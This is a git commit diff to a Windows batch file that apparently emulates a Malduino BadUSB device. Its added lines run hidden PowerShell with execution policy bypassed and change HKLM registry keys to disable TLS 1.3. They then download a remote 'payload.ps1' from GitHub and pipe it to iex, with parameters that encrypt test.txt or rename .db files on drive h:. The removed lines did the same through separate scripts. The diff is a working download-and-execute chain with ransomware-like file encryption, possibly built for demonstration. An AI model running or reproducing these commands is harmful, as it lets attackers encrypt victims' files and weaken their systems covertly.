9f2ec061a5bf32c2eed81a27a3b9792ba9fcf18a
Paulo C. Marcon <pcmarcon@gmail.com>
2021-08-03 00:46:25 -0300

    Update virtual_malduino.bat

--- virtual_malduino.bat
+++ virtual_malduino.bat
@@ -1,26 +1,15 @@
 rem use this .bat on the windows computer when is not possible to connect the USB Malduino
 
-rem change the drive letter if needed
-d:
+rem change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex}
 
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex"
-
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(reg add HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex"
-
-rem please select what payload to run 
-rem single_file_enc.ps1 to encrypt the file test.txt 
-rem or
-rem single_file_ren.ps1 just to rename the file test.txt to test.txt.ren
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex"
-# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_ren.ps1') | iex"
+rem run payload script
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type="single_enc"; $file="test.txt"; $file_path="h:"; $show_screen="no"; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex}
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {$type="multi_ren"; $file=".db"; $file_path="h:"; $show_screen="yes"; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex}
 
